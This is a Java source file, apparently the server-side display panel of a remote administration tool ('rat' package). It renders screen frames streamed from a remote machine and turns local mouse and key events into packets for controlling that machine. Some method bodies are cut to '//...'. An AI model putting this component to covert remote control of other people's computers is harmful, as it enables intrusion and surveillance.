package de.sogomn.rat.server.gui;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;

import de.sogomn.engine.IKeyboardListener;
import de.sogomn.engine.IMouseListener;
import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.engine.util.AbstractListenerContainer;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.packet.MouseEventPacket;
import de.sogomn.rat.util.FrameEncoder.IFrame;

public final class DisplayPanel extends AbstractListenerContainer<IGuiController> implements IMouseListener, IKeyboardListener {
	
	private String title;
	private Screen screen;
	private BufferedImage image;
	
	private MouseEventPacket lastMouseEventPacket;
	private KeyEventPacket lastKeyEventPacket;
	
	private static final int SCREEN_WIDTH = 1920 / 2;
	private static final int SCREEN_HEIGHT = 1080 / 2;
	
	public static final String MOUSE_EVENT = "Mouse event";
	public static final String KEY_EVENT = "Key event";
	public static final String CLOSED = "Closed";
	
	public DisplayPanel() {
		//...
	}
	
	private Screen createScreen(final int screenWidth, final int screenHeight) {
		final Screen screen = new Screen(screenWidth, screenHeight);
		final WindowAdapter windowAdapter = new WindowAdapter() {
			@Override
			public void windowClosing(final WindowEvent w) {
				notifyListeners(controller -> controller.userInput(CLOSED));
			}
		};
		final BufferedImage[] icons = RattyGui.GUI_ICONS.stream().toArray(BufferedImage[]::new);
		
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setTitle(title);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.setBackgroundColor(Color.BLACK);
		screen.addMouseListener(this);
		screen.addKeyboardListener(this);
		screen.addWindowListener(windowAdapter);
		screen.addListener(g -> {
			ImageUtils.applyLowGraphics(g);
			
			g.drawImage(image, 0, 0, null);
		});
		screen.setIcons(icons);
		
		return screen;
	}
	
	private void drawToScreenImage(final BufferedImage imagePart, final int x, final int y) {
		final Graphics2D g = image.createGraphics();
		
		ImageUtils.applyLowGraphics(g);
		
		g.drawImage(imagePart, x, y, null);
		g.dispose();
	}
	
	private void updateImage(final int screenWidth, final int screenHeight) {
		if (image == null || image.getWidth() != screenWidth || image.getHeight() != screenHeight) {
			image = new BufferedImage(screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB);
		}
	}
	
	private void updateScreen(final int screenWidth, final int screenHeight) {
		if (screen == null || screen.getInitialWidth() != screenWidth || screen.getInitialHeight() != screenHeight || !screen.isOpen()) {
			if (screen != null) {
				screen.close();
			}
			
			screen = createScreen(screenWidth, screenHeight);
		}
		
		screen.show();
		screen.redraw();
	}
	
	@Override
	public void mouseEvent(final int x, final int y, final int button, final boolean flag) {
		final byte type = flag ? MouseEventPacket.PRESS : MouseEventPacket.RELEASE;
		final int buttonEvent;
		
		if (button == MouseEvent.BUTTON1) {
			buttonEvent = MouseEvent.BUTTON1_DOWN_MASK;
		} else if (button == MouseEvent.BUTTON2) {
			buttonEvent = MouseEvent.BUTTON2_DOWN_MASK;
		} else if (button == MouseEvent.BUTTON3) {
			buttonEvent = MouseEvent.BUTTON3_DOWN_MASK;
		} else {
			buttonEvent = MouseEvent.NOBUTTON;
		}
		
		lastMouseEventPacket = new MouseEventPacket(x, y, buttonEvent, type);
		
		notifyListeners(controller -> controller.userInput(MOUSE_EVENT));
	}
	
	@Override
	public void mouseMotionEvent(final int x, final int y, final int modifiers) {
		//...
	}
	
	@Override
	public void mouseWheelEvent(final int x, final int y, final int rotation) {
		//...
	}
	
	@Override
	public void keyboardEvent(final int key, final boolean flag) {
		final byte type = flag ? KeyEventPacket.PRESS : KeyEventPacket.RELEASE;
		
		lastKeyEventPacket = new KeyEventPacket(key, type);
		
		notifyListeners(controller -> controller.userInput(KEY_EVENT));
	}
	
	public void setTitle(final String title) {
		this.title = title;
	}
	
	public void showImage(final BufferedImage image) {
		this.image = image;
		
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		updateScreen(width, height);
	}
	
	public void showFrame(final IFrame frame, final int screenWidth, final int screenHeight) {
		updateImage(screenWidth, screenHeight);
		drawToScreenImage(frame.image, frame.x, frame.y);
		updateScreen(screenWidth, screenHeight);
	}
	
	public void showFrames(final IFrame[] frames, final int screenWidth, final int screenHeight) {
		updateImage(screenWidth, screenHeight);
		
		for (final IFrame frame : frames) {
			drawToScreenImage(frame.image, frame.x, frame.y);
		}
		
		updateScreen(screenWidth, screenHeight);
	}
	
	public MouseEventPacket getLastMouseEventPacket() {
		return lastMouseEventPacket;
	}
	
	public KeyEventPacket getLastKeyEventPacket() {
		return lastKeyEventPacket;
	}
	
}
